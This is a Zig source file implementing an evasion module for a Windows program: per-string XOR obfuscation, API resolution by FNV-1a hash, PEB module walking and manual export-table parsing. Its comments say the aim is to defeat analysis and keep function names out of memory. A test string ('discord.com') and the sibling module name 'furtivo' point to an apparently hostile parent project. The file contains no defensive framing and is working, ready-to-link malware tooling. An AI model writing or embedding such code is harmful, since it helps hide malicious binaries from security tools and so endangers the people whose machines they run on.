const std = @import("std");
const ntdll = @import("direto/ntdll.zig");

// Per-string randomized XOR obfuscation.
// Each string gets its own comptime-random key derived from a hash of the string itself.
// The key is embedded alongside the encrypted data, so decryption is self-contained.
// This defeats single-key analysis: finding one string doesn't reveal others.

fn comptimeHash(s: []const u8) u64 {
    @setEvalBranchQuota(100000);
    var h: u64 = 0xcbf29ce484222325;
    for (s) |c| {
        h ^= c;
        h *%= 0x100000001b3;
    }
    return h;
}

// ---- API Hashing (FNV-1a 32-bit) ----
// Allows resolving exports by hash instead of string, eliminating decrypted
// function names in memory at runtime. The binary contains only u32 constants.

fn fnv1aHash32(s: []const u8) u32 {
    var h: u32 = 0x811c9dc5;
    for (s) |c| {
        h ^= c;
        h *%= 0x01000193;
    }
    return h;
}

pub fn apiHash(comptime name: []const u8) u32 {
    @setEvalBranchQuota(100000);
    var h: u32 = 0x811c9dc5;
    for (name) |c| {
        h ^= c;
        h *%= 0x01000193;
    }
    return h;
}

// ---- Module lookup (PEB InMemoryOrder list) ----
// Self-contained so obf.zig does not depend on furtivo.zig (avoiding a cycle).

fn findModuleBase(name: []const u8) ?usize {
    const peb = ntdll.getPEB();
    if (peb == 0) return null;
    const ldr = @as(*usize, @ptrFromInt(peb + 0x18)).*;
    if (ldr == 0) return null;
    const head = @as(*usize, @ptrFromInt(ldr + 0x20)).*;
    if (head == 0) return null;

    var current = @as(*usize, @ptrFromInt(head)).*;
    while (current != head and current != 0) {
        const entry = current - 0x10;
        const name_len = @as(*u16, @ptrFromInt(entry + 0x58)).*;
        const name_buf = @as(*usize, @ptrFromInt(entry + 0x60)).*;
        if (name_len > 0 and name_buf != 0) {
            const ws = @as([*]const u16, @ptrFromInt(name_buf))[0 .. name_len / 2];
            if (ws.len == name.len) {
                var match = true;
                for (name, 0..) |c, i| {
                    var lc = ws[i];
                    if (lc >= 'A' and lc <= 'Z') lc += 32;
                    var cl: u16 = c;
                    if (cl >= 'A' and cl <= 'Z') cl += 32;
                    if (lc != cl) { match = false; break; }
                }
                if (match) return @as(*usize, @ptrFromInt(entry + 0x30)).*;
            }
        }
        current = @as(*usize, @ptrFromInt(current)).*;
    }
    return null;
}

fn loadLibrary(name: []const u8, depth: u32) usize {
    if (depth > 4 or name.len + 1 > 64) return 0;
    const k32 = findModuleBase("kernel32.dll") orelse return 0;
    const addr = resolveExport(k32, fnv1aHash32("LoadLibraryA"), depth + 1);
    if (addr == 0) return 0;
    const LoadLibraryA = @as(*const fn ([*:0]const u8) callconv(.winapi) usize, @ptrFromInt(addr));
    var buf: [64]u8 = undefined;
    @memcpy(buf[0..name.len], name);
    buf[name.len] = 0;
    return LoadLibraryA(@ptrCast(&buf));
}

// Resolve an export by hash. Handles PE forwarded exports ("DLL.Function") by
// loading the target module and resolving the forwarded name there.
fn resolveExport(base: usize, target_hash: u32, depth: u32) usize {
    if (base == 0) return 0;

    const e_lfanew = @as(*u32, @ptrFromInt(base + 0x3C)).*;
    const optional_header = base + e_lfanew + 0x18;
    const export_dir_rva = @as(*u32, @ptrFromInt(optional_header + 0x70)).*;
    const export_dir_size = @as(*u32, @ptrFromInt(optional_header + 0x74)).*;
    if (export_dir_rva == 0) return 0;

    const export_dir = base + export_dir_rva;
    const num_names = @as(*u32, @ptrFromInt(export_dir + 0x18)).*;
    const addr_of_names = base + @as(*u32, @ptrFromInt(export_dir + 0x20)).*;
    const addr_of_functions = base + @as(*u32, @ptrFromInt(export_dir + 0x1C)).*;
    const addr_of_name_ordinals = base + @as(*u32, @ptrFromInt(export_dir + 0x24)).*;

    var i: usize = 0;
    while (i < num_names) : (i += 1) {
        const name_rva = @as(*u32, @ptrFromInt(addr_of_names + i * 4)).*;
        const name_ptr = @as([*]const u8, @ptrFromInt(base + name_rva));
        var len: usize = 0;
        while (name_ptr[len] != 0) : (len += 1) {}
        if (fnv1aHash32(name_ptr[0..len]) == target_hash) {
            const ordinal = @as(*u16, @ptrFromInt(addr_of_name_ordinals + i * 2)).*;
            const func_rva = @as(*u32, @ptrFromInt(addr_of_functions + ordinal * 4)).*;

            // A function RVA that points inside the export directory is a
            // forwarder string ("OTHERDLL.Function"), not executable code.
            const is_forwarder = export_dir_size > 0 and
                func_rva >= export_dir_rva and
                func_rva < export_dir_rva + export_dir_size;
            if (is_forwarder and depth < 4) {
                return resolveForwarder(base + func_rva, depth);
            }
            return base + func_rva;
        }
    }
    return 0;
}

fn resolveForwarder(forwarder_ptr: usize, depth: u32) usize {
    const p = @as([*]const u8, @ptrFromInt(forwarder_ptr));
    var len: usize = 0;
    while (p[len] != 0) : (len += 1) {}
    const s = p[0..len];

    const dot = std.mem.indexOfScalar(u8, s, '.') orelse return 0;
    const dll = s[0..dot];
    const func = s[dot + 1 ..];
    if (dll.len == 0 or func.len == 0) return 0;

    var name_buf: [64]u8 = undefined;
    if (dll.len + 4 > name_buf.len) return 0;
    @memcpy(name_buf[0..dll.len], dll);
    @memcpy(name_buf[dll.len..][0..4], ".dll");
    const dll_name = name_buf[0 .. dll.len + 4];

    const mod = findModuleBase(dll_name) orelse loadLibrary(dll_name, depth + 1);
    if (mod == 0) return 0;
    return resolveExport(mod, fnv1aHash32(func), depth + 1);
}

// Walks the export table, hashes each export name, compares to target_hash.
// No string decryption needed — the binary stores only u32 hash constants.
pub fn getProcAddressByHash(base: usize, target_hash: u32) !usize {
    return resolveExport(base, target_hash, 0);
}

// Resolve an export by (obfuscated) name. Kept for callers that prefer names;
// internally hashes the name so all resolution shares the forwarder handling.
pub fn getProcAddress(base: usize, func_name_obf: []const u8) !usize {
    const name = try dexor(std.heap.page_allocator, func_name_obf);
    defer std.heap.page_allocator.free(name);
    return resolveExport(base, fnv1aHash32(name), 0);
}

// ---- Stack string decryption ----
// The encrypted bytes (from xorStr) live in .rdata, but decryption happens
// on the stack at runtime via a runtime while-loop. No heap allocation.
pub fn decToStack(comptime s: []const u8) [s.len]u8 {
    const enc = comptime xorStr(s);
    const key = enc[0];
    var buf: [s.len]u8 = undefined;
    var i: usize = 0;
    while (i < s.len) : (i += 1) {
        buf[i] = enc[i + 1] ^ key;
    }
    return buf;
}

// Obfuscated string: stores key + encrypted bytes at comptime
pub fn xorStr(comptime s: []const u8) [s.len + 1]u8 {
    @setEvalBranchQuota(100000);
    const key_byte: u8 = @intCast(comptimeHash(s) & 0xFF);
    var res: [s.len + 1]u8 = undefined;
    res[0] = key_byte;
    for (s, 0..) |c, i| {
        res[i + 1] = c ^ key_byte;
    }
    return res;
}

// Decrypt: first byte is the key, rest is the ciphertext
pub fn dexor(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    if (s.len < 1) return allocator.alloc(u8, 0);
    const key_byte = s[0];
    const ct = s[1..];
    var res = try allocator.alloc(u8, ct.len);
    for (ct, 0..) |c, i| {
        res[i] = c ^ key_byte;
    }
    return res;
}

// For backwards compat: dexor without embedded key (legacy callers pass raw XOR'd bytes)
pub fn dexorLegacy(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    var res = try allocator.alloc(u8, s.len);
    const key = 0xAA;
    for (s, 0..) |c, i| {
        res[i] = c ^ key;
    }
    return res;
}

// ============================================================
//  Tests (run on the host: zig test src/obf.zig)
// ============================================================

test "xorStr + dexor round trip" {
    const enc = comptime xorStr("discord.com");
    const plain = try dexor(std.testing.allocator, &enc);
    defer std.testing.allocator.free(plain);
    try std.testing.expectEqualStrings("discord.com", plain);
}

test "obfuscated bytes contain no plaintext" {
    const enc = comptime xorStr("hunter2-secret");
    try std.testing.expect(std.mem.indexOf(u8, &enc, "hunter2") == null);
}

test "apiHash is stable and distinguishing" {
    try std.testing.expectEqual(apiHash("LoadLibraryA"), apiHash("LoadLibraryA"));
    try std.testing.expect(apiHash("LoadLibraryA") != apiHash("LoadLibraryW"));
}
